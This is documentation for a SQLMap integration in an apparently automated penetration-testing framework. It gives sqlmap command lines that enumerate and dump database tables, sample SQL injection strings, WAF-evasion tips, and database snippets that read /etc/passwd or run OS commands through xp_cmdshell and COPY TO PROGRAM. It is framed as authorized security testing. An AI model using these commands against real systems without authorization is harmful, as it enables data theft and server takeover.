# SQLMap Integration

## Overview

SQLMap is the industry-standard tool for automated SQL injection detection and exploitation. It supports GET/POST parameters, cookies, headers, and WAF evasion.

**Purpose**: Detect and exploit SQL injection vulnerabilities  
**Phase**: Initial Access & Exploitation (Stage 3)  
**Risk Level**: MEDIUM (detection) / HIGH (exploitation)  
**Approval**: Required for all operations

## How SQLMap Works in MEDUSA

SQLMap systematically tests parameters for SQLi vulnerabilities:

1. **Detection Phase**: Tests various SQLi techniques
   - Boolean-based blind
   - Error-based
   - Union-based
   - Stacked queries
   - Time-based blind

2. **Confirmation Phase**: Confirms vulnerability type and DBMS
3. **Exploitation Phase**: Extracts data if authorized
4. **Post-Exploitation**: Database enumeration and privilege escalation

## Usage

### Quick SQL Injection Test

```python
from medusa.client import MedusaClient

client = MedusaClient(...)

# Quick test (safest)
result = await client.test_sql_injection(
    url="http://vulnerable-app.com/search?q=test",
    level=1,
    risk=1
)

if result['metadata']['vulnerable']:
    print("✗ SQL injection detected!")
    for finding in result['findings']:
        print(f"  Parameter: {finding['parameter']}")
        print(f"  Type: {finding['injection_types']}")
else:
    print("✓ No SQL injection found")
```

### POST Parameter Testing

```python
# Test POST parameters
result = await client.test_sql_injection(
    url="http://vulnerable-app.com/login",
    method="POST",
    data="username=admin&password=test",
    level=2,
    risk=1
)
```

### Direct Tool Usage

```python
from medusa.tools.sql_injection import SQLMapScanner

scanner = SQLMapScanner()

# Quick scan (GET parameter)
result = await scanner.quick_scan(
    "http://target.com/page?id=1"
)

# Deep scan with data extraction
result = await scanner.deep_scan(
    url="http://target.com/search",
    data="q=test&sort=name"
)

# Test specific parameter
result = await scanner.test_parameter(
    url="http://target.com/user",
    parameter="id",
    method="GET"
)
```

## Configuration Options

### Testing Levels & Risk

| Level | Coverage | Speed | False Positives |
|-------|----------|-------|-----------------|
| 1 | Basic tests | Very Fast | Very Low |
| 2 | Standard tests | Fast | Low |
| 3 | Comprehensive | Medium | Medium |
| 4 | Extensive | Slow | Moderate |
| 5 | All tests | Very Slow | Possible |

**Recommendation**: Start with level 1-2

| Risk | Action | Invasiveness | Detection |
|-----|--------|--------------|-----------|
| 1 | Detection only | Minimal | Very Low |
| 2 | Database enumeration | Moderate | Low |
| 3 | Data extraction | Aggressive | High |

**Recommendation**: Use risk=1 unless authorized

### Common Parameters

```python
# GET request with parameter
result = await scanner.test_injection(
    url="http://target.com/product?id=1&cat=books",
    method="GET",
    level=1,
    risk=1
)

# POST with data
result = await scanner.test_injection(
    url="http://target.com/search",
    method="POST",
    data="search=test&filter=price",
    level=1,
    risk=1
)

# Cookie-based
result = await scanner.test_injection(
    url="http://target.com/dashboard",
    cookies="sessionid=abc123; userid=42",
    level=2,
    risk=1
)

# Custom headers
result = await scanner.test_injection(
    url="http://target.com/api",
    headers={"Authorization": "Bearer token123"},
    level=2,
    risk=1
)
```

## Output Format

### Detection Results

```json
{
  "success": true,
  "tool": "sqlmap",
  "findings": [
    {
      "type": "sql_injection",
      "vulnerable": true,
      "parameter": "id",
      "location": "GET",
      "injection_types": ["boolean-based blind"],
      "dbms": "MySQL 5.7",
      "databases": ["webapp_db", "test"],
      "severity": "CRITICAL",
      "confidence": "high"
    }
  ],
  "metadata": {
    "vulnerable": true,
    "target_url": "http://target.com/product?id=1",
    "level": 1,
    "risk": 1
  }
}
```

### With Data Extraction

```json
{
  "findings": [
    {
      "type": "sql_injection",
      "vulnerable": true,
      "parameter": "id",
      "extractable_columns": ["id", "username", "email", "password"],
      "databases": ["users", "products"],
      "tables": ["users", "admin_users", "employees"],
      "severity": "CRITICAL"
    }
  ]
}
```

## Command Line Usage

### Basic Detection

```bash
sqlmap -u "http://target.com/page?id=1" --batch --level=1 --risk=1
```

### With POST Data

```bash
sqlmap -u "http://target.com/login" \
  --method POST \
  --data "username=admin&password=test" \
  --batch --level=1 --risk=1
```

### Database Enumeration

```bash
sqlmap -u "http://target.com/page?id=1" \
  --batch --level=2 --risk=2 \
  --dbs  # List databases
```

### Data Extraction

```bash
sqlmap -u "http://target.com/page?id=1" \
  --batch --level=2 --risk=3 \
  -D webapp \
  -T users \
  --dump  # Extract table data
```

## Testing Strategy

### Stage 1: Quick Assessment (Level 1, Risk 1)

```python
# Fast, safe, minimal detection
result = await scanner.quick_scan("http://target.com/page?id=1")

if not result['metadata']['vulnerable']:
    print("Likely not vulnerable")
    return
```

### Stage 2: Confirm Vulnerability (Level 2, Risk 1)

```python
# More thorough, still non-invasive
result = await scanner.test_injection(
    url="http://target.com/page?id=1",
    level=2,
    risk=1
)

if result['findings']:
    finding = result['findings'][0]
    print(f"Vulnerability Type: {finding['injection_types']}")
    print(f"DBMS: {finding['dbms']}")
```

### Stage 3: Authorized Exploitation (Risk 2-3)

```python
# Only with explicit authorization
if NOT_AUTHORIZED:
    raise PermissionError("Data extraction requires authorization")

result = await scanner.extract_data(
    url="http://target.com/page?id=1",
    database="webapp",
    table="users",
    columns=["username", "email"]
)
```

## Safety & Approval Levels

### Level 1-2 with Risk 1
- ✅ Testing only, no data extraction
- ✅ Auto-approved for authorized penetration tests
- ✅ Minimal payload delivery
- ⚠️ Still creates database logs

### Risk 2 Operations
- ⚠️ More aggressive payloads
- ⚠️ Moderate database impact
- ⚠️ Requires MEDIUM risk approval

### Risk 3 + Data Extraction
- 🔴 CRITICAL operations
- 🔴 Directly accesses databases
- 🔴 Requires explicit CRITICAL approval
- 🔴 High potential for incident response triggers

## Common Vulnerabilities

### Boolean-Based Blind SQLi

```
Original: /product?id=1
Test: /product?id=1 AND 1=1  (same result)
Test: /product?id=1 AND 1=2  (different result)
```

**Detection**: Page differences indicate vulnerability

### Error-Based SQLi

```
Original: /search?q=test
Test: /search?q=test'  (causes error)
```

**Detection**: SQL error messages in response

### Union-Based SQLi

```
Original: /product?id=1 UNION SELECT NULL,NULL,NULL
```

**Detection**: Additional columns appear in output

### Time-Based Blind SQLi

```
Original: /page?id=1
Test: /page?id=1 AND SLEEP(5)  (delays 5 seconds)
```

**Detection**: Response time changes

## Bypassing WAF/IDS

SQLMap includes WAF evasion techniques:

```python
result = await scanner.test_injection(
    url="http://target.com",
    level=3,
    risk=2,
    # SQLMap will try: encoding, case sensitivity, comment injection, etc.
)
```

Manual techniques:
- Hex encoding
- Case variation
- Comment injection
- Chunking payloads

## Database-Specific Information

### MySQL
```
# Get version
SELECT VERSION();

# User enumeration
SELECT user FROM mysql.user;

# File read
SELECT LOAD_FILE('/etc/passwd');
```

### MSSQL
```
# Get version
SELECT @@version;

# Database enumeration
SELECT * FROM information_schema.databases;

# Command execution (via xp_cmdshell)
EXEC xp_cmdshell 'whoami';
```

### PostgreSQL
```
# Get version
SELECT version();

# Superuser check
SELECT current_user;

# Command execution (via copy to program)
COPY (SELECT '') TO PROGRAM 'whoami';
```

## Troubleshooting

### No Vulnerability Detected

```python
# Try higher levels
result = await scanner.test_injection(
    url="url",
    level=3,  # More tests
    risk=1
)

# Manual inspection
# Check for:
# - Error messages
# - Response differences
# - Timing delays
```

### Timeouts

```python
# Use local SQLMap for faster feedback
# Check if target is responding
curl -v "http://target.com/page?id=1"

# Increase SQLMap timeout
scanner = SQLMapScanner(timeout=900)  # 15 minutes
```

### False Positives

Verify manually:
```python
# Get injection details
finding = result['findings'][0]
parameter = finding['parameter']
injection_type = finding['injection_types'][0]

# Test manually with browser DevTools
# Modify parameter and observe differences
```

## Best Practices

1. **Always start with level 1, risk 1**
   ```python
   result = await scanner.quick_scan(url)
   ```

2. **Test non-critical parameters first**
   - Search/filter parameters less risky
   - ID parameters more obvious

3. **Use in test environment when possible**
   - Lower risk of triggering alerts
   - Better for learning

4. **Log all operations**
   - MEDUSA logs all SQLMap operations
   - Maintain audit trail for authorization

5. **Verify findings manually**
   - Confirm each finding before reporting
   - Understand the vulnerability type

## Performance

### For Quick Testing
```python
result = await scanner.quick_scan(url)
# ~10-30 seconds
```

### For Thorough Testing
```python
result = await scanner.deep_scan(url)
# 2-5 minutes (depends on site responsiveness)
```

### For Complete Data Extraction
```python
result = await scanner.extract_data(url, "db", "table")
# 5-30 minutes (depends on data volume)
```

## Installation

### Linux
```bash
# Debian/Ubuntu
apt install sqlmap

# Or pip
pip install sqlmap
```

### macOS
```bash
brew install sqlmap
```

### From Source
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py -u "http://target.com?id=1"
```

## Integration with Other Tools

### After httpx Discovers Live Servers

```python
# Step 1: Get live servers
live_servers = await client.validate_web_targets(targets)

# Step 2: Test each for SQLi
for server in live_servers['findings']:
    # Find parameters by spidering (manual or tool)
    # Then test for SQLi
    result = await client.test_sql_injection(
        url=server['url'] + "?id=1",
        level=1,
        risk=1
    )
    
    if result['metadata']['vulnerable']:
        print(f"SQLi found in {server['url']}")
```

## References

- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Documentation](http://sqlmap.org/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)

